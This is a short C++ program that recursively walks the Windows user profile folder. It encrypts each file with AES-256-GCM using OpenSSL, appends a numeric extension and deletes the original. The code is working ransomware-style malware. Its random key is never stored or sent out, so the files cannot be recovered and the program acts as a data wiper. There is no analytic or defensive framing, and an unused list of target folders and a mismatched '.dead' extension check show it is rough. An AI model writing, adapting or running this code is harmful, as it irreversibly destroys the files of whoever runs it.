#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <openssl/evp.h>
#include <openssl/rand.h>

namespace fs = std::filesystem;

void cifrar_archivo(const fs::path& ruta_entrada, const std::vector<unsigned char>& llave) {

    fs::path ruta_salida = ruta_entrada;
    ruta_salida += ".9213912938129381824712984";

    unsigned char iv[12];
    RAND_bytes(iv, sizeof(iv));

    std::ifstream archivo_in(ruta_entrada, std::ios::binary);
    std::ofstream archivo_out(ruta_salida, std::ios::binary);

    if (!archivo_in || !archivo_out) return;

    archivo_out.write(reinterpret_cast<char*>(iv), sizeof(iv));

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, llave.data(), iv);

    std::vector<char> buffer(4096);
    unsigned char ciphertext[4096 + 16];
    int len, ciphertext_len;

    while (archivo_in.read(buffer.data(), buffer.size()) || archivo_in.gcount() > 0) {
        EVP_EncryptUpdate(ctx, ciphertext, &len, reinterpret_cast<unsigned char*>(buffer.data()), archivo_in.gcount());
        archivo_out.write(reinterpret_cast<char*>(ciphertext), len);
    }

    EVP_EncryptFinal_ex(ctx, ciphertext, &len);
    archivo_out.write(reinterpret_cast<char*>(ciphertext), len);

    unsigned char tag[16];
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag);
    archivo_out.write(reinterpret_cast<char*>(tag), 16);

    EVP_CIPHER_CTX_free(ctx);
    archivo_in.close();
    archivo_out.close();

    fs::remove(ruta_entrada);
    std::cout << "Block " << ruta_entrada.filename() << std::endl;
}

int main() {
    char* userProfile = getenv("USERPROFILE");

std::vector<std::string> klasorler = {
    std::string(userProfile) + "\\Desktop",
    std::string(userProfile) + "\\Documents",
    std::string(userProfile) + "\\Pictures",
    std::string(userProfile) + "\\Videos",
    std::string(userProfile) + "\\AppData",
    std::string(userProfile) + "\\Program Files",
    std::string(userProfile) + "\\Temp",
    std::string(userProfile) + "\\Windows",
    std::string(userProfile) + "\\ProgramData",
    std::string(userProfile) + "\\Program Files (x86)"
};

    std::vector<unsigned char> llave(32);
    RAND_bytes(llave.data(), llave.size());

    try {
        if (fs::exists(userProfile) && fs::is_directory(userProfile)) {
            for (const auto& entrada :fs::recursive_directory_iterator(userProfile)) {
                if (fs::is_regular_file(entrada.path())) {
                    if (entrada.path().extension() != ".dead") {
                        cifrar_archivo(entrada.path(), llave);
                    }
                }
            }
            std::cout << "\n>>> Listo" << std::endl;
        } else {
            std::cerr << "La carpeta no existe" << std::endl;
        }
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }

    return 0;
}



